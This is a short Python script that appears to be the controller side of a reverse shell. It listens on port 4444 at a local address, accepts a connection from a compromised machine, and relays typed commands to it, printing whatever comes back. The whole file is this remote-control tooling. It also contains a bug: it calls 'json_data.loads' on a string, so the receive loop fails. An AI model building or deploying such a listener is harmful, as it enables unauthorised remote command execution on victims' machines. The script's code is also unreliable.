#!/usr/bin/env python3
import socket
import json


class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Waiting for incoming connecction!")
        self.conn, addr = listener.accept()
        print("[+] Got a connection from " + str(addr))
        print(self.conn.recv(1024).decode("utf-8"))

    def execute_remote_command(self,command):
        self.conn.send(command.encode("utf-8"))
        return self.reliable_recv()

    def reliable_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.conn.recv(1024).decode("utf-8")
                return json_data.loads(json_data)
            except ValueError:
                continue

    def run(self):
        while True:
            command = input(">> ")
            if command in ["exit", "quit"]:
                break
            result = self.execute_remote_command(command)
            print(result)

listen = Listener("192.168.0.108",4444)
listen.run()






